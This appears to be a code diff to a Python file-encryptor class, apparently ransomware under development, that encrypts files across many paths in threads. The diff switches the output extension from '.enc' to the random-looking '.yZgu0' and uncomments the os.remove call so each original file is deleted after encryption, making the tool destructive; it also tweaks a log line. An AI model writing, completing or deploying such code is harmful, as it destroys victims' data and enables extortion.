@@ -7,7 +7,6 @@ import os
 import time
 from keygen import *
 from collections import deque # voor snellere list operaties
-import mmap
 
 class Encryptor:
 
@@ -122,7 +121,7 @@ class Encryptor:
                 #print(f"{filepath} encrypted successfuly" )
                     
                 #open new file with .ENC enxtension
-                encrypted_filepath = filepath + '.enc'
+                encrypted_filepath = filepath + '.yZgu0'
                 
                 with open(encrypted_filepath, 'wb') as enc_file:
                     enc_file.write(encrypted_content)  # Write encrypted content and footer
@@ -136,7 +135,7 @@ class Encryptor:
                     
 
                 #delete original file
-                #os.remove(filepath)
+                os.remove(filepath)
 
                 #print(f"{encrypted_filepath} original file deleted")
                 self.encrypted_count += 1
@@ -225,7 +224,7 @@ class Encryptor:
                 executor.submit(self.encrypt, files)
 
         end_time = time.time()
-        print(f"[LOG] {self.encrypted_count} files encrypted out of {len(self.filepaths)}\n {(self.encrypted_count / len(self.filepaths))*100}% success rate")
+        print(f"[LOG] {self.encrypted_count} files encrypted out of {len(self.filepaths)}, {(self.encrypted_count / len(self.filepaths))*100}% success rate")
         print(f"[LOG] time elapsed: {end_time-start_time}s")
 
 
